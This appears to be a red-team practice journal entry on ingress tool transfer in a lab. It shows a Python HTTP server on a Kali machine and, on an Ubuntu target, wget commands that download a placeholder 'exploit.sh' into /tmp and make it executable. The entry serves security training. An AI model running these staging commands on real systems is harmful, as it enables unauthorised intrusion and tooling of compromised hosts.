# 📥 Day 6: Ingress Tool Transfer

## 📝 Executive Summary
After gaining initial access, a Red Teamer often needs to bring additional tools into the environment to perform further enumeration or privilege escalation. Today, I practiced "Living off the Land" by using built-in utilities (Python and Wget) to transfer files between my attack machine and the target.

## 💻 Lab Scenario

### 1. The Setup (Kali Linux)
I created a dummy file named `exploit.sh` to simulate a malicious script. I then used Python's built-in module to host a lightweight HTTP server.

```bash
# Starting the server on Port 80
sudo python3 -m http.server 80
2. The Transfer (Ubuntu Target)
Connected via SSH, I navigated to the /tmp directory. This is a standard practice because /tmp is almost always writable by any user, making it a safe landing zone for tools.

Bash

cd /tmp
wget [http://192.168.160.](http://192.168.160.)x/exploit.sh
chmod +x exploit.sh
3. Verification
I confirmed the file integrity and permissions using ls -la.
